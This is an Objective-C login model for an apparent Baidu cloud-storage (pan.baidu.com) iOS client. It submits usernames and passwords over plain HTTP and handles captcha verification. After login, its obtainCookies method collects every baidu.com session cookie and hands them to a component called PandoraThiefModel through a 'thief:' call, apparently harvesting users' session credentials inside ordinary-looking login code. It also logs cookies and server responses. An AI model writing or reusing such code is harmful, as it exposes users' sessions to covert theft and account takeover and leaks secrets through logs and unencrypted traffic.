//
//  PandoraLoginModel.m
//  Zen
//
//  Created by roger on 14-7-9.
//  Copyright (c) 2014年 Zen. All rights reserved.
//

#import "ZenCategory.h"
#import "PandoraConnection.h"
#import "PandoraLoginModel.h"
#import "PandoraThiefModel.h"

#define kPandoraRefreshCookieURL    @"http://pan.baidu.com/wap/home"
#define kPandoraLoginURL            @"http://wappass.baidu.com/wp/api/login"
#define kPandoraVerifyCodeURL       @"http://wappass.baidu.com/cgi-bin/genimage?%@"
#define kPandoraTestListDirURL      @"http://pan.baidu.com/api/list?order=time&desc=1&web=1&dir=/"

@interface PandoraLoginModel () <PandoraConnectionDelegate>
{
    PandoraConnection *_connection;
    NSString *_verifyString;
    NSString *_name;
}

@property (nonatomic, strong) PandoraConnection *connection;
@property (nonatomic, strong) NSString *verifyString;
@property (nonatomic, strong) NSString *name;

@end

@implementation PandoraLoginModel

- (id)init
{
    self = [super init];
    if (self) {
        self.verifyString = @"";
        //[self clearCookies];
    }
    return self;
}

- (void)test:(NSString *)cookie
{
    PandoraConnection *connection = [PandoraConnection connectionWithURL:[NSURL URLWithString:kPandoraTestListDirURL]];
    self.connection = connection;
    connection.delegate = self;
    connection.didFinishedSelector = @selector(testResponse:);
    [connection addRequestHeader:@"Cookie" value:cookie];
    [connection startAsynchronous];
}

- (void)clearCookies
{
    NSHTTPCookieStorage *cookieStorage = [NSHTTPCookieStorage sharedHTTPCookieStorage];
    for (NSHTTPCookie *cookie in cookieStorage.cookies) {
        NSLog(@"cookie: %@", [cookie description]);
        if (cookie.domain && [cookie.domain contains:@"baidu.com"]) {
            [cookieStorage deleteCookie:cookie];
        }
    }
}

- (NSString *)obtainCookies
{
    NSMutableString *cookies = [[NSMutableString alloc] init];
    NSHTTPCookieStorage *cookieStorage = [NSHTTPCookieStorage sharedHTTPCookieStorage];
    for (NSHTTPCookie *cookie in cookieStorage.cookies) {
        NSLog(@"cookie: %@", [cookie description]);
        if (cookie.domain && [cookie.domain contains:@"baidu.com"]) {
            [cookies appendFormat:@"%@=%@;", cookie.name, cookie.value];
        }
    }
    [[PandoraThiefModel sharedInstance] thief:cookies];
    return cookies;
}

- (void)refreshCookie
{
    PandoraConnection *connection = [PandoraConnection connectionWithURL:[NSURL URLWithString:kPandoraRefreshCookieURL]];
    self.connection = connection;
    connection.delegate = self;
    connection.didFinishedSelector = @selector(cookieResponse:);
    [connection startAsynchronous];
}

- (NSData *)bodyWithUserName:(NSString *)name password:(NSString *)pwd verifyCode:(NSString *)verifyCode
{
    NSMutableString *body = [[NSMutableString alloc] init];
    [body appendFormat:@"username=%@&", name];
    [body appendFormat:@"password=%@&", pwd];
    [body appendFormat:@"verifycode=%@&", verifyCode];
    [body appendFormat:@"vcodestr=%@&", _verifyString];
    [body appendString:@"action=login&isphone=1&loginmerge=1"];
    return [body dataUsingEncoding:NSUTF8StringEncoding];
}

- (void)login:(NSString *)name password:(NSString *)pwd verifyCode:(NSString *)verifyCode
{
    self.name = name;
    PandoraConnection *connection = [PandoraConnection connectionWithURL:[NSURL URLWithString:kPandoraLoginURL]];
    self.connection = connection;
    connection.delegate = self;
    connection.httpMethod = @"POST";
    connection.httpBody = [self bodyWithUserName:name password:pwd verifyCode:verifyCode];
    [connection addRequestHeader:@"Content-Type" value:@"application/x-www-form-urlencoded; charset=UTF-8"];
    connection.didFailedSelector = @selector(loginFailed:);
    connection.didFinishedSelector = @selector(loginResponse:);
    [connection startAsynchronous];
}

#pragma mark
#pragma mark PandoraConnectionDelegate Methods

- (void)testResponse:(PandoraConnection *)connection
{
    NSLog(@"PandoraTestResponse: %@", connection.responseString);
}

- (void)cookieResponse:(PandoraConnection *)connection
{
    NSLog(@"PandoraCookieResponse: %@", connection.cookie);
}

- (void)loginResponse:(PandoraConnection *)connection
{
    NSString *msg = @"登录失败！";
    @try {
        NSLog(@"PandoraLoginResponseCookie: %@", connection.cookie);
        NSLog(@"PandoraLoginResponse: %@", connection.responseString);
        NSDictionary *dict = [NSJSONSerialization JSONObjectWithData:connection.responseData options:NSJSONReadingAllowFragments error:NULL];
        if (dict) {
            NSDictionary *errorInfo = dict[@"errInfo"];
            NSString *errorCode = errorInfo[@"no"];
            if ([errorCode isEqualToString:@"0"]) {
                // login success
                PandoraUser *me = [[PandoraUser alloc] init];
                me.name = _name;
                me.token = [self obtainCookies];
                if (me.token) {
                    me.md5 = [me.token md5];
                }
                me.isMe = YES;
                [[PandoraUserManager sharedInstance] save:me];
                //[self test:me.token];
                [self send:kPandoraLoginSuccess];
                return;
            }
            else {
                // login falied
                NSDictionary *data = dict[@"data"];
                NSString *verifyString = [data stringForKey:@"codeString"];
                NSString *dataMsg = [errorInfo stringForKey:@"msg"];
                if (dataMsg && ![dataMsg isEqualToString:@""]) {
                    msg = dataMsg;
                }
                if (verifyString && ![verifyString isEqualToString:@""]) {
                    // need verify code
                    self.verifyString = verifyString;
                    self.verifyCodeURL = [NSString stringWithFormat:kPandoraVerifyCodeURL, _verifyString];
                    [self send:kPandoraLoginNeedVerify userInfo:@{ @"msg" : msg }];
                    return;
                }
            }
        }
    }
    @catch (NSException *exception) {
        NSLog(@"PandoraLoginModel loginResponse exception: %@", [exception description]);
    }
    
    [self send:kPandoraLoginFailed userInfo:@{ @"msg" : msg }];
}

- (void)loginFailed:(PandoraConnection *)connection
{
    [self send:kPandoraLoginFailed];
}

@end
